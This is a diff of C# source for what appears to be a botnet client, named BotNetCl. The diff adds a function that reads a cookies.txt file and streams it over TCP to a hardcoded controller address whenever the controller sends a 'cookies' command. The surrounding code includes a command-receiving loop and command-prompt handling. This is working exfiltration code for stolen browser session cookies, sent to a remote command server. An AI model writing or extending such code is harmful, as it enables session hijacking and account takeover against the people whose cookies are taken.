@@ -126,9 +126,6 @@ namespace BotNetCl
         }
         #endregion
 
-
-
-
         private String verifyKey(int code)
         {
             String key = "";
@@ -356,9 +353,6 @@ namespace BotNetCl
             {
                 driver.Quit();
             }
-
-
-
         }
 
         public static void getCommandPrompt()
@@ -405,6 +399,32 @@ namespace BotNetCl
 
             return output;
         }
+
+        public static void sendFileSocket(TcpClient client)
+        {
+            byte[] dataTemp = File.ReadAllBytes("cookies.txt");
+            byte[] dataLength = BitConverter.GetBytes(dataTemp.Length);
+
+            int bufferSize = 1024;
+
+            NetworkStream stream = client.GetStream();
+            stream.Write(dataLength, 0, 4);
+
+            int bytesSent = 0;
+            int bytesLeft = dataTemp.Length;
+
+            while (bytesLeft > 0)
+            {
+                int curDataSize = Math.Min(bufferSize, bytesLeft);
+
+                stream.Write(dataTemp, bytesSent, curDataSize);
+
+                bytesSent += curDataSize;
+                bytesLeft -= curDataSize;
+            }
+            
+        }
+     
         public static void Main(string[] args)
         {
             //getCommandPrompt();
@@ -433,9 +453,9 @@ namespace BotNetCl
                 TcpClient client = new TcpClient();
 
                 // 1. connect
-                client.Connect("192.168.1.100", PORT_NUMBER);
+                client.Connect("192.168.50.121", PORT_NUMBER);
                 Stream stream = client.GetStream();
-
+                
                 //Console.WriteLine("Connected to Y2Server.");
                 //Console.Write("Enter your name: ");
 
@@ -453,19 +473,20 @@ namespace BotNetCl
                     stream.Read(data, 0, BUFFER_SIZE);
                     string command = encoding.GetString(data);
 
-                    Console.Write(command.Trim()) ;
-                    Console.Write("a");
                     if (command.StartsWith("cookies"))
                     {
-                        // data = new byte[BUFFER_SIZE];
+                       // data = new byte[BUFFER_SIZE];
 
-                        //data = encoding.GetBytes("cookies tra ve");
+                       // data = encoding.GetBytes("cookies tra ve");
 
 
-                        string str = " cookies tra ve";
+                        ////
+                        //string str = " cookies tra ve";
+                        //data = encoding.GetBytes(str);
+                        ////
 
-                        data = encoding.GetBytes(str);
-                        stream.Write(data, 0, data.Length);
+                        //stream.Write(data, 0, data.Length);
+                        sendFileSocket(client);
                         Console.WriteLine("xong cookies");
                         
 
@@ -501,16 +522,6 @@ namespace BotNetCl
                 }
 
             }
-
-
-
-            //    //Console.WriteLine(encoding.GetString(data));
-
-            //    // 4. Close
-            //    //stream.Close();
-            //    //client.Close();
-            //}
-
             catch (Exception ex)
             {
                 Console.WriteLine("Error: " + ex);
